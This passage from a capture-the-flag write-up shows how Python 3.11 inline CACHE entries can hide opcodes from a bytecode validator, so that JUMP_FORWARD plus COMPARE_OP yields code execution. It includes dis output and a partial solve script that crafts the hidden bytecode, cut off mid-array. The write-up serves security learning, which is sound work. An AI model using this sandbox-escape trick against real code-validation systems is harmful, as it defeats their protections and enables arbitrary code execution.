somehow gain arbitrary code execution using only 2 OPCODES. But this seems impossible?! Expecially since we are forced to use \u003Ccode>COMPARE_OP\u003C/code>, which at face value doesn’t seem to do much. We can try picking an opcode like CALL, but we end up with issues since we still need to use LOAD_NAME or LOAD_GLOBAL to get function we want to call. If we use LOAD_NAME, then we can get objects on the stack, but we can’t really do much with it.\u003C/p>\n\u003Cp>A key insight, which was provided and necessary to identify in the challenge files is the Python version of the server. In the Dockerfile, we can see the server is running \u003Ccode>python3.11\u003C/code>. Python3.11 adds some interesting features, but 1 subtle feature which it states in the release notes:\u003C/p>\n\u003Cblockquote>\n\u003Cp>The bytecode now contains inline cache entries, which take the form of the newly-added CACHE instructions. Many opcodes expect to be followed by an exact number of caches, and instruct the interpreter to skip over them at runtime. Populated caches can look like arbitrary instructions, so great care should be taken when reading or modifying raw, adaptive bytecode containing quickened data.\u003C/p>\n\u003C/blockquote>\n\u003Ch3 id=\"inline-cache\">\u003Ca href=\"#inline-cache\">Inline Cache?\u003C/a>\u003C/h3>\n\u003Cp>Inline cache is an addition added via the following cpython \u003Ca href=\"https://github.com/python/cpython/issues/90997\">issue\u003C/a>. The idea is that certain OPCODES will be provided space that allows for the interpreter to cache certain values. This is done to speed up the interpreter, and is a form of optimization. The cache is stored in the bytecode directly, so does not require any overhead or change on the interpreter side. We can see this when we inspect certain functions using dis in \u003Ccode>python3.11\u003C/code>:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">Python \u003C/span>\u003Cspan style=\"--0:#79B8FF\">3.11\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.4 (main, Jun  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">7\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2023\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">12\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003Cspan style=\"--0:#79B8FF\">45\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003Cspan style=\"--0:#79B8FF\">48\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">GCC\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">11.3\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.0] on linux\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">Type \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"help\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"copyright\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"credits\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">or\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"license\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> more information.\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">>>>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> dis \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> dis\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">>>>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> f():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">...\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">     \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'1'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">...\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">>>>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> dis(f, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">show_caches\u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#79B8FF\">True\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">RESUME\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                   \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">LOAD_GLOBAL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">              \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">              \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">              \u003C/span>\u003Cspan style=\"--0:#79B8FF\">6\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">              \u003C/span>\u003Cspan style=\"--0:#79B8FF\">8\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">10\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">12\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">14\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">LOAD_CONST\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">               \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'1'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">16\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">PRECALL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">18\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">20\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CALL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">22\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">24\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">26\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">28\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CACHE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">             \u003C/span>\u003Cspan style=\"--0:#79B8FF\">30\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">RETURN_VALUE\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"Python 3.11.4 (main, Jun  7 2023, 12:45:48) [GCC 11.3.0] on linuxType &#x22;help&#x22;, &#x22;copyright&#x22;, &#x22;credits&#x22; or &#x22;license&#x22; for more information.>>> from dis import dis>>> def f():...     return int(&#x27;1&#x27;)...>>> dis(f, show_caches=True)  1           0 RESUME                   0  2           2 LOAD_GLOBAL              1 (NULL + int)              4 CACHE                    0              6 CACHE                    0              8 CACHE                    0             10 CACHE                    0             12 CACHE                    0             14 LOAD_CONST               1 (&#x27;1&#x27;)             16 PRECALL                  1             18 CACHE                    0             20 CALL                     1             22 CACHE                    0             24 CACHE                    0             26 CACHE                    0             28 CACHE                    0             30 RETURN_VALUE\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>With the \u003Ccode>show_caches\u003C/code> flag in any dis function, we can see the caches space for each operation. What this means at interest for us, is that when LOAD_GLOBAL instruction is executed, the interpreter will need to actually jump over the 5 cache entries. Interestingly, \u003Ccode>COMPARE_OP\u003C/code> is one such function which has 2 CACHE entries.\u003C/p>\n\u003Cp>Note however, that if we call \u003Ccode>get_instructions\u003C/code> function as shown in the source code on this function:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">>>>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> get_instructions(f)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">{\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'CALL'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'LOAD_GLOBAL'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'RETURN_VALUE'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'LOAD_CONST'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'PRECALL'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'RESUME'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\">>> get_instructions(f){&#x27;CALL&#x27;, &#x27;LOAD_GLOBAL&#x27;, &#x27;RETURN_VALUE&#x27;, &#x27;LOAD_CONST&#x27;, &#x27;PRECALL&#x27;, &#x27;RESUME&#x27;}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>We don’t see those CACHE lines. With this, we have an idea of how to solve the challenge.\nWe want to design our bytecode in such a way that the only OPCODES visible to dis, are \u003Ccode>COMPARE_OP\u003C/code>, and something else. We can then use the CACHE entries to store the actual OPCODES we want to run. What will that something else be, \u003Ccode>JUMP_FORWARD\u003C/code>! This will give us the ability to jump into these CACHE entries, and execute the hidden OPCODES.\u003C/p>\n\u003Ch3 id=\"solve-script-1\">\u003Ca href=\"#solve-script-1\">Solve Script\u003C/a>\u003C/h3>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> opcode\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> opcode \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> opmap\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> base64\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> dis\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> marshal\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> tempfile\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sys, os\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> k \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> opmap:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">globals\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()[k] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> opmap[k]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">f\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">breakpoint\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">code \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> f.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">__code__\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">b \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> marshal.dumps(code)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">dis.dis(code, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">show_caches\u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#79B8FF\">True\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">co_code \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> code.co_code\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(co_code))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">co_code_section \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(co_code).to_bytes(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">byteorder\u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'little'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> co_code\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">prefix \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> b[:b.find(co_code_section)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">suffiix \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> b[b.find(co_code_section) \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(co_code_section):]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">\"\"\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">Note: Lines that end with #, indicate its visible to dis.Bytecode, rest are hidden\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">\"\"\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">new_code \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">bytearray\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">([\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JUMP_FORWARD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">COMPARE_OP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">LOAD_GLOBAL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">COMPARE_OP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">COMPARE_OP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">NOP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan 